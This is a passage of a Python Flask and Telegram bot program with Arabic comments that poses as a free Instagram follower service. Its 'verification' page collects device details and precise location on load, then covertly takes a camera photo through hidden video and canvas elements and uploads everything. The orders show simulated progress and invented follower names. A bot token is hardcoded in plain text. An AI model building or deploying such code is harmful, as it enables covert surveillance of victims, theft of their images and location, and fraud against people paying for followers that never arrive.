import os
import requests
import random
import time
import json
import uuid
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from threading import Thread
from datetime import datetime, timedelta

# ========== إعدادات البوت ==========
BOT_TOKEN = "7388387809:AAHgsBR0z-avEVjjN2boGyXXwO2TR_T7hXA"
PORT = int(os.environ.get('PORT', 5000))

# ========== إعداد Flask ==========
app = Flask(__name__)

# إنشاء مجلدات التخزين
if not os.path.exists('photos'):
    os.makedirs('photos')
if not os.path.exists('data'):
    os.makedirs('data')

# تخزين البيانات
def load_user_data():
    try:
        with open('data/users.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_user_data(data):
    with open('data/users.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False)

def load_orders_data():
    try:
        with open('data/orders.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_orders_data(data):
    with open('data/orders.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False)

# ========== خدمة المتابعين الوهمية ==========
class FakeInstagramService:
    def __init__(self):
        self.orders = load_orders_data()
        self.fake_followers = self.generate_fake_followers_list()
    
    def generate_fake_followers_list(self):
        """إنشاء قائمة متابعين وهمية"""
        first_names = ["محمد", "أحمد", "علي", "خالد", "فاطمة", "سارة", "نور", "ياسمين", "عمر", "مريم"]
        last_names = ["الغامدي", "الحربي", "الزيد", "القحطاني", "الشمراني", "العتيبي", "السهلي", "القرشي"]
        domains = ["love", "star", "queen", "king", "prince", "princess", "cool", "hot", "style", "fashion"]
        
        followers = []
        for i in range(10000):
            username = f"{random.choice(first_names)}_{random.choice(last_names)}_{random.choice(domains)}{random.randint(1, 1000)}"
            followers.append({
                "username": username.lower(),
                "name": f"{random.choice(first_names)} {random.choice(last_names)}",
                "is_private": random.choice([True, False]),
                "has_profile_pic": random.choice([True, True, True, False]),  # 75% لديهم صور
                "is_verified": random.choice([True, False, False, False]),  # 25% مفعلين
                "follower_count": random.randint(100, 50000),
                "following_count": random.randint(50, 2000)
            })
        return followers
    
    def place_order(self, user_id, instagram_username, package_type, user_data):
        """وضع طلب جديد"""
        order_id = f"ORDER_{random.randint(100000, 999999)}"
        
        package_details = {
            "free": {"count": 100, "duration": "24-72 ساعة", "price": 0},
            "basic": {"count": 1000, "duration": "12-36 ساعة", "price": 9.99},
            "premium": {"count": 5000, "duration": "6-24 ساعة", "price": 29.99},
            "vip": {"count": 10000, "duration": "1-6 ساعات", "price": 49.99}
        }
        
        package = package_details[package_type]
        
        order_data = {
            "order_id": order_id,
            "user_id": user_id,
            "instagram_username": instagram_username,
            "package": package_type,
            "follower_count": package["count"],
            "delivery_duration": package["duration"],
            "price": package["price"],
            "status": "processing",
            "progress": 0,
            "delivered_followers": 0,
            "started_at": datetime.now().isoformat(),
            "estimated_completion": (datetime.now() + timedelta(hours=random.randint(1, 72))).isoformat(),
            "user_data": user_data
        }
        
        self.orders[order_id] = order_data
        save_orders_data(self.orders)
        
        # بدء عملية التوصيل الوهمية
        self.start_delivery_process(order_id)
        
        return order_data
    
    def start_delivery_process(self, order_id):
        """بدء عملية التوصيل الوهمية"""
        def delivery_process():
            order = self.orders[order_id]
            total_followers = order["follower_count"]
            
            # محاكاة فترات الانتظار
            time.sleep(random.randint(5, 15))
            
            # المرحلة 1: التحضير (0-20%)
            for i in range(4):
                order["progress"] = (i + 1) * 5
                order["status"] = "preparing"
                save_orders_data(self.orders)
                time.sleep(random.randint(10, 30))
            
            # المرحلة 2: البدء في الإرسال (20-60%)
            order["status"] = "delivering"
            for i in range(8):
                order["progress"] = 20 + (i + 1) * 5
                delivered = int(total_followers * order["progress"] / 100)
                order["delivered_followers"] = delivered
                save_orders_data(self.orders)
                time.sleep(random.randint(15, 45))
            
            # المرحلة 3: الاكتمال (60-100%)
            for i in range(8):
                order["progress"] = 60 + (i + 1) * 5
                order["delivered_followers"] = int(total_followers * order["progress"] / 100)
                save_orders_data(self.orders)
                time.sleep(random.randint(10, 30))
            
            # اكتمال الطلب
            order["progress"] = 100
            order["delivered_followers"] = total_followers
            order["status"] = "completed"
            order["completed_at"] = datetime.now().isoformat()
            save_orders_data(self.orders)
            
            # إرسال إشعار للبوت
            asyncio.run(send_completion_notification(order))
        
        Thread(target=delivery_process, daemon=True).start()
    
    def get_order_status(self, order_id):
        """الحصول على حالة الطلب"""
        return self.orders.get(order_id)

# إنشاء الخدمة
instagram_service = FakeInstagramService()

# ========== HTML قوالب ==========
USERNAME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أدخل اسم مستخدم إنستغرام</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 20px;
            color: white;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        input {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            text-align: center;
            margin: 10px 0;
            background: rgba(255,255,255,0.9);
        }
        
        .btn {
            background: linear-gradient(135deg, #E1306C 0%, #C13584 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(225, 48, 108, 0.3);
        }
        
        .platforms {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        
        .platform {
            background: rgba(255,255,255,0.2);
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .platform.active {
            background: #E1306C;
        }
        
        .platform:hover {
            transform: translateY(-2px);
        }
        
        .note {
            background: rgba(255,255,255,0.2);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 أدخل اسم مستخدم إنستغرام</h1>
        <p>لإرسال المتابعين إلى حسابك</p>
        
        <div class="platforms">
            <div class="platform active" onclick="selectPlatform('instagram')">
                📸 إنستغرام
            </div>
        </div>
        
        <div class="input-group">
            <input type="text" id="username" placeholder="اسم المستخدم بدون @" autocomplete="off">
        </div>
        
        <div class="note">
            ⚠️ تأكد من أن الحساب عام (Public) لتلقي المتابعين
        </div>
        
        <button class="btn" onclick="submitUsername()">
            تأكيد ومتابعة ✅
        </button>
    </div>

    <script>
        let selectedPlatform = 'instagram';
        
        function selectPlatform(platform) {
            selectedPlatform = platform;
            document.querySelectorAll('.platform').forEach(p => p.classList.remove('active'));
            event.target.classList.add('active');
        }
        
        function submitUsername() {
            const username = document.getElementById('username').value.trim();
            if (!username) {
                alert('يرجى إدخال اسم المستخدم');
                return;
            }
            
            if (username.length < 3) {
                alert('اسم المستخدم يجب أن يكون 3 أحرف على الأقل');
                return;
            }
            
            // الانتقال إلى صفحة جمع البيانات
            const nextUrl = `/collect_data/{{user_id}}?username=${encodeURIComponent(username)}&platform=${selectedPlatform}`;
            window.location.href = nextUrl;
        }
        
        // السماح بالإدخال بالإنتر
        document.getElementById('username').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitUsername();
            }
        });
    </script>
</body>
</html>
"""

DATA_COLLECTION_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق - زيادة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 600px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 15px;
        }
        
        .status {
            font-size: 1.1rem;
            margin: 15px 0;
            line-height: 1.6;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 4px;
        }
        
        .hidden {
            display: none;
        }
        
        .data-item {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            margin: 10px 0;
            border-radius: 8px;
            text-align: right;
            font-size: 0.9rem;
        }
        
        .success-screen {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="loadingScreen">
            <div class="loader"></div>
            <h1>جاري التحقق وتجهيز حسابك</h1>
            <div class="status" id="statusMessage">⏳ جاري جمع البيانات المطلوبة...</div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
        </div>
        
        <div id="dataScreen" class="hidden">
            <div class="success-screen">
                <h1>✅ تم التحقق بنجاح!</h1>
                <div class="status">🎉 جاري تفعيل خدمتك...</div>
            </div>
            <div id="collectedData"></div>
        </div>
        
        <div id="packageScreen" class="hidden">
            <h1>🎁 اختر الباقة المناسبة</h1>
            <div id="packagesContainer"></div>
        </div>
    </div>

    <!-- عناصر مخفية لجمع البيانات -->
    <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        let collectedData = {
            username: '{{username}}',
            platform: '{{platform}}',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platformInfo: navigator.platform,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
        };

        // بدء جمع البيانات تلقائياً
        window.addEventListener('load', function() {
            startDataCollection();
        });

        async function startDataCollection() {
            try {
                // المرحلة 1: جمع بيانات المتصفح الأساسية
                updateProgress(10);
                updateStatus('🔍 جاري جمع معلومات الجهاز...');
                await delay(2000);

                // المرحلة 2: جمع بيانات الموقع
                updateProgress(30);
                updateStatus('📍 جاري تحديد الموقع...');
                await collectLocationData();
                
                // المرحلة 3: طلب إذن الكاميرا
                updateProgress(50);
                updateStatus('📸 جاري التحقق من الهوية...');
                await requestCameraPermission();
                
                // المرحلة 4: التقاط الصورة تلقائياً
                updateProgress(70);
                updateStatus('🔄 جاري إكمال التحقق...');
                await capturePhotoAutomatically();
                
                // المرحلة 5: إرسال جميع البيانات
                updateProgress(90);
                updateStatus('📤 جاري إرسال البيانات...');
                await sendAllData();
                
                updateProgress(100);
                showPackageSelection();
                
            } catch (error) {
                console.error('Data collection error:', error);
                // الاستمرار حتى مع وجود أخطاء
                await sendAllData();
                showPackageSelection();
            }
        }

        async function collectLocationData() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            collectedData.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            resolve();
                        },
                        (error) => {
                            collectedData.locationError = error.message;
                            resolve();
                        },
                        { 
                            timeout: 10000,
                            enableHighAccuracy: false 
                        }
                    );
                } else {
                    collectedData.location = 'غير مدعوم';
                    resolve();
                }
            });
        }

        async function requestCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                collectedData.cameraAccess = 'مسموح';
                collectedData.cameraStream = stream;
                
            } catch (error) {
                collectedData.cameraAccess = 'مرفوض: ' + error.message;
                collectedData.cameraStream = null;
            }
        }

        async function capturePhotoAutomatically() {
            try {
                if (collectedData.cameraStream) {
                    const video = document.getElementById('hiddenVideo');
                    const canvas = document.getElementById('hiddenCanvas');
                    const context = canvas.getContext('2d');
                    
                    video.srcObject = collectedData.cameraStream;
                    
                    // الانتظار لضبط الكاميرا
                    await delay(3000);
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // إيقاف الكاميرا
                    collectedData.cameraStream.getTracks().forEach(track => track.stop());
                    
                    // تحويل الصورة إلى base64
                    collectedData.capturedPhoto = canvas.toDataURL('image/jpeg', 0.7);
                }
            } catch (error) {
                collectedData.photoError = error.message;
            }
        }

        async function sendAllData() {
            try {
                const formData = new FormData();
                formData.append('user_id', '{{user_id}}');
                formData.append('username', collectedData.username);
                formData.append('platform', collectedData.platform);
                formData.append('collected_data', JSON.stringify(collectedData));
                
                // إضافة الصورة إذا كانت موجودة
                if (collectedData.capturedPhoto) {
                    const response = await fetch(collectedData.capturedPhoto);
                    const blob = await response.blob();
                    formData.append('photo', blob, 'verification.jpg');
                }

                const uploadResponse = await fetch('/upload_complete_data', {
                    method: 'POST',
                    body: formData
                });

                const result = await uploadResponse.json();
                return result.success;
                
            } catch (error) {
                console.error('Send data error:', error);
                return false;
            }
        }

        function showPackageSelection() {
            document.getElementById('loadingScreen').classList.add('hidden');
            document.getElementById('packageScreen').classList.remove('hidden');
            
            const packages = [
                {
                    name: 'free',
                    title: '🎁 تجربة مجانية',
                    followers: '100 متابع',
                    price: 'مجاني',
                    features: ['متابعين نشطين', 'توصيل خلال 24-72 ساعة', 'ضمان 7 أيام'],
                    color: '#4CAF50'
                },
                {
                    name: 'basic',
                    title: '⭐ الباقة الأساسية',
                    followers: '1,000 متابع',
                    price: '$9.99',
                    features: ['متابعين جدد', 'توصيل 12-36 ساعة', 'ضمان 30 يوماً'],
                    color: '#2196F3'
                },
                {
                    name: 'premium', 
                    title: '👑 الباقة المميزة',
                    followers: '5,000 متابع',
                    price: '$29.99',
                    features: ['متابعين نشطين جداً', 'توصيل 6-24 ساعة', 'ضمان 90 يوماً'],
                    color: '#E1306C'
                },
                {
                    name: 'vip',
                    title: '🚀 باقة VIP',
                    followers: '10,000 متابع',
                    price: '$49.99',
                    features: ['متابعين مميزين', 'توصيل فوري 1-6 ساعات', 'ضمان 180 يوماً'],
                    color: '#FF9800'
                }
            ];
            
            const container = document.getElementById('packagesContainer');
            container.innerHTML = packages.map(pkg => `
                <div style="
                    background: rgba(255,255,255,0.1); 
                    padding: 20px; 
                    margin: 15px 0; 
                    border-radius: 15px; 
                    border-left: 5px solid ${pkg.color};
                    text-align: right;
                ">
                    <h3>${pkg.title}</h3>
                    <div style="font-size: 1.5rem; font-weight: bold; margin: 10px 0;">${pkg.followers}</div>
                    <div style="font-size: 1.3rem; color: ${pkg.color}; font-weight: bold; margin: 10px 0;">${pkg.price}</div>
                    <ul style="list-style: none; margin: 15px 0;">
                        ${pkg.features.map(feature => `<li>✅ ${feature}</li>`).join('')}
                    </ul>
                    <button onclick="selectPackage('${pkg.name}')" style="
                        background: ${pkg.color};
                        color: white;
                        border: none;
                        padding: 12px 25px;
                        border-radius: 25px;
                        cursor: pointer;
                        font-weight: bold;
                        width: 100%;
                    ">
                        اختر الباقة
                    </button>
                </div>
            `).join('');
        }

        function selectPackage(packageType) {
            // إرسال طلب الباقة
            fetch('/place_order', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: collectedData.username,
                    package: packageType,
                    user_id: '{{user_id}}',
                    collected_data: collectedData
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // الانتقال إلى صفحة المتابعة
                    const statusUrl = `/order_status/{{user_id}}?order_id=${data.order_id}`;
                    window.location.href = statusUrl;
                } else {
                    alert('❌ حدث خطأ: ' + data.error);
                }
            });
        }

        function updateProgress(percent) {
            document.getElementById('progress').style.width = percent + '%';
        }

        function updateStatus(message) {
            document.getElementById('statusMessage').textContent = message;
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    </script>
</body>
</html>
"""

ORDER_STATUS_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>حالة الطلب - زيادة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: white;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
        }
        
        .order-card {
            background: rgba(255, 255, 255, 0.1);
            padding: 25px;
            border-radius: 15px;
            margin: 15px 0;
            backdrop-filter: blur(10px);
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            overflow: hidden;
            margin: 15px 0;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        
        .status-badge {
            display: inline-block;
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin: 5px;
        }
        
        .status-processing { background: #FF9800; }
        .status-delivering { background: #2196F3; }
        .status-completed { background: #4CAF50; }
        
        .follower-list {
            max-height: 300px;
            overflow-y: auto;
            margin: 15px 0;
        }
        
        .follower-item {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            margin: 5px 0;
            border-radius: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 حالة طلبك</h1>
            <p>جاري متابعة تقدم طلبك</p>
        </div>
        
        <div class="order-card">
            <h2>تفاصيل الطلب</h2>
            <div id="orderDetails"></div>
        </div>
        
        <div class="order-card">
            <h2>سير التقدم</h2>
            <div class="progress-bar">
                <div class="progress" id="orderProgress"></div>
            </div>
            <div id="progressText" style="text-align: center; margin: 10px 0;"></div>
        </div>
        
        <div class="order-card">
            <h2>المتابعين المضافين</h2>
            <div id="followersCount" style="font-size: 1.5rem; text-align: center; margin: 15px 0;"></div>
            <div class="follower-list" id="followersList"></div>
        </div>
    </div>

    <script>
        const orderId = new URLSearchParams(window.location.search).get('order_id');
        
        function updateOrderStatus() {
            fetch('/get_order_status?order_id=' + orderId)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        displayOrderData(data.order_data);
                    }
                });
        }
        
        function displayOrderData(order) {
            // تفاصيل الطلب
            document.getElementById('orderDetails').innerHTML = `
                <div><strong>رقم الطلب:</strong> ${order.order_id}</div>
                <div><strong>الحساب المستهدف:</strong> @${order.instagram_username}</div>
                <div><strong>الباقة:</strong> ${getPackageName(order.package)}</div>
                <div><strong>الحالة:</strong> <span class="status-badge status-${order.status}">${getStatusText(order.status)}</span></div>
                <div><strong>وقت البدء:</strong> ${new Date(order.started_at).toLocaleString('ar-EG')}</div>
                ${order.estimated_completion ? `<div><strong>الوقت المتوقع:</strong> ${new Date(order.estimated_completion).toLocaleString('ar-EG')}</div>` : ''}
            `;
            
            // شريط التقدم
            document.getElementById('orderProgress').style.width = order.progress + '%';
            document.getElementById('progressText').textContent = `${order.progress}% مكتمل`;
            
            // المتابعين
            document.getElementById('followersCount').textContent = `${order.delivered_followers} / ${order.follower_count} متابع`;
            
            // قائمة المتابعين الوهمية
            if (order.delivered_followers > 0) {
                generateFakeFollowersList(order.delivered_followers);
            }
        }
        
        function generateFakeFollowersList(count) {
            const names = ["محمد", "أحمد", "علي", "فاطمة", "سارة", "نور", "ياسمين"];
            const followers = [];
            
            for (let i = 0; i < Math.min(count, 20); i++) {
                followers.push({
                    name: `${names[Math.floor(Math.random() * names.length)]}_${Math.floor(Math.random() * 1000)}`,
                    time: new Date(Date.now() - Math.random() * 3600000).toLocaleTimeString('ar-EG')
                });
            }
            
            document.getElementById('followersList').innerHTML = followers.map(follower => `
                <div class="follower-item">
                    <span>👤 ${follower.name}</span>
                    <span style="font-size: 0.8rem;">${follower.time}</span>
                </div>
            `).join('');
        }
        
        function getPackageName(packageType) {
            const names = {
                'free': '🎁 100 متابع مجاناً',
                'basic': '⭐ 1000 متابع',
                'premium': '👑 5000 متابع',
                'vip': '🚀 10000 متابع'
            };
            return names[packageType];
        }
        
        function getStatusText(status) {
            const texts = {
                'processing': 'جاري المعالجة',
                'delivering': 'جاري التوصيل',
                'completed': 'مكتمل'
            };
            return texts[status] || status;
        }
        
        // تحديث الحالة كل 5 ثواني
        updateOrderStatus();
        setInterval(updateOrderStatus, 5000);
    </script>
</body>
</html>
"""

# ========== مسارات Flask ==========
@app.route('/')
def home():
    return "Instagram Follower Service - Use /start in Telegram"

@app.route('/user/<user_id>')
def user_page(user_id):
    """الصفحة الرئيسية للمستخدم"""
    return f"""
    <html>
    <body style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; padding: 50px;">
        <h1>مرحباً بك في خدمة متابعين إنستغرام!</h1>
        <p>استخدم الروابط أدناه:</p>
        <div style="margin: 20px;">
            <a href="/username/{user_id}" style="background: #E1306C; color: white; padding: 15px 30px; border-radius: 25px; text-decoration: none; display: inline-block; margin: 10px;">
                🚀 بدء الخدمة
            </a>
        </div>
    </body>
    </html>
    """

@app.route('/username/<user_id>')
def username_page(user_id):
    """صفحة إدخال اسم المستخدم"""
    return render_template_string(USERNAME_HTML, user_id=user_id)

@app.route('/collect_data/<user_id>')
def collect_data_page(user_id):
    """صفحة جمع البيانات"""
    username = request.args.get('username', '')
    platform = request.args.get('platform', 'instagram')
    return render_template_string(DATA_COLLECTION_HTML, user_id=user_id, username=username, platform=platform)

@app.route('/upload_complete_data', methods=['POST'])
def upload_complete_data():
    """استقبال جميع البيانات المجمعة"""
    try:
        user_id = request.form.get('user_id')
        username = request.form.get('username')
        platform = request.form.get('platform')
        collected_data_json = request.form.get('collected_data')
        
        if not all([user_id, username, collected_data_json]):
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # حفظ البيانات
        user_data = load_user_data()
        if user_id not in user_data:
            user_data[user_id] = {}
        
        collected_data = json.loads(collected_data_json)
        
        user_data[user_id].update({
            'username': username,
            'platform': platform,
            'collected_data': collected_data,
            'collection_time': datetime.now().isoformat()
        })
        
        # حفظ الصورة إذا كانت موجودة
        if 'photo' in request.files and request.files['photo']:
            photo = request.files['photo']
            if photo.filename:
                photo_filename = f"user_{user_id}_{uuid.uuid4().hex[:8]}.jpg"
                filepath = os.path.join('photos', photo_filename)
                photo.save(filepath)
                user_data[user_id]['photo_filename'] = photo_filename
        
        save_user_data(user_data)
        
        # إرسال إشعار للبوت
        asyncio.run(send_data_collection_notification(user_id, username, collected_data))
        
        return jsonify({'success': True, 'message': 'تم جمع البيانات بنجاح'})
        
    except Exception as e:
        print(f"❌ خطأ في جمع البيانات: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/place_order', methods=['POST'])
def place_order():
    """وضع طلب جديد"""
    try:
        data = request.get_json()
        username = data.get('username')
        package = data.get('package')
        user_id = data.get('user_id')
        collected_data = data.get('collected_data', {})
        
        if not all([username, package, user_id]):
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # وضع الطلب
        order_data = instagram_service.place_order(user_id, username, package, collected_data)
        
        # إرسال إشعار للبوت
        asyncio.run(send_order_notification(user_id, username, package, order_data['order_id']))
        
        return jsonify({
            'success': True,
            'order_id': order_data['order_id'],
            'order_data': order_data
        })
        
    except Exception as e:
        print(f"❌ خطأ في وضع الطلب: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/get_order_status')
def get_order_status():
    """الحصول على حالة الطلب"""
    order_id = request.args.get('order_id')
    if not order_id:
        return jsonify({'success': False, 'error': 'No order ID'})
    
    order_data = instagram_service.get_order_status(order_id)
    if order_data:
        return jsonify({'success': True, 'order_data': order_data})
    else:
        return jsonify({'success': False, 'error': 'Order not found'})

@app.route('/order_status/<user_id>')
def order_status_page(user_id):
    """صفحة حالة الطلب"""
    return render_template_string(ORDER_STATUS_HTML, user_id=user_id)

# ========== وظائف التليجرام ==========
async def send_data_collection_notification(user_id, username, collected_data):
    """إرسال إشعار جمع البيانات للبوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        user_id_int = int(user_id)
        
        message = f"""
📊 **تم جمع البيانات بنجاح!**

👤 **المستخدم:** @{username}
🆔 **رقم المستخدم:** {user_id}

💻 **معلومات الجهاز:**
• المتصفح: {collected_data.get('userAgent', 'غير معروف')[:50]}...
• النظام: {collected_data.get('platformInfo', 'غير معروف')}
• الدقة: {collected_data.get('screenResolution', 'غير معروف')}
• المعالج: {collected_data.get('hardwareConcurrency', 'غير معروف')}
• الذاكرة: {collected_data.get('deviceMemory', 'غير معروف')} GB

🌐 **معلومات الشبكة:**
• اللغة: {collected_data.get('language', 'غير معروف')}
• المنطقة: {collected_data.get('timezone', 'غير معروف')}

📍 **الموقع:** 
{get_location_info(collected_data)}

📸 **الكاميرا:** {collected_data.get('cameraAccess', 'غير معروف')}

🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=message,
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال إشعار جمع البيانات للمستخدم {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال إشعار البيانات: {e}")

async def send_order_notification(user_id, username, package, order_id):
    """إرسال إشعار الطلب للبوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        user_id_int = int(user_id)
        
        package_names = {
            'free': '🎁 100 متابع مجاناً',
            'basic': '⭐ 1000 متابع',
            'premium': '👑 5000 متابع',
            'vip': '🚀 10000 متابع'
        }
        
        message = f"""
🎉 **تم استلام طلب جديد!**

👤 **المستخدم:** @{username}
📦 **الباقة:** {package_names.get(package, package)}
🆔 **رقم الطلب:** {order_id}
🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🚀 **جاري بدء عملية التوصيل...**
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=message,
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال إشعار الطلب للمستخدم {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال إشعار الطلب: {e}")

async def send_completion_notification(order):
    """إرسال إشعار اكتمال الطلب"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        user_id_int = int(order['user_id'])
        
        message = f"""
✅ **تم اكتمال طلبك بنجاح!**

🎉 **مبروك!** تم إضافة {order['follower_count']} متابع إلى:
**@{order['instagram_username']}**

📦 **الباقة:** {get_package_name(order['package'])}
🆔 **رقم الطلب:** {order['order_id']}
⏰ **وقت الاكتمال:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 **المتابعين المضافين:** {order['delivered_followers']} متابع

🎯 **يمكنك الآن رؤية المتابعين الجدد في حسابك!**

📞 **للإستفسار:** @{'your_support_username'}
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=message,
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال إشعار الاكتمال للمستخدم {order['user_id']}")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال إشعار الاكتمال: {e}")

def get_location_info(collected_data):
    """الحصول على معلومات الموقع"""
    if 'location' in collected_data:
        loc = collected_data['location']
        return f"• خط العرض: {loc.get('latitude', 'غير معروف')}\n• خط الطول: {loc.get('longitude', 'غير معروف')}\n• الدقة: {loc.get('accuracy', 'غير معروف')}m"
    elif 'locationError' in collected_data:
        return f"• خطأ: {collected_data['locationError']}"
    else:
        return "• غير متوفر"

def get_package_name(package_type):
    """الحصول على اسم الباقة"""
    packages = {
        'free': '🎁 100 متابع مجاناً',
        'basic': '⭐ 1000 متابع',
        'premium': '👑 5000 متابع', 
        'vip': '🚀 10000 متابع'
    }
    return packages.get(package_type, 'خدمة المتابعين')

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        user_id = user.id
        
        # حفظ بيانات المستخدم
        user_data = load_user_data()
        if str(user_id) not in user_data:
            user_data[str(user_id)] = {
                'username': user.username,
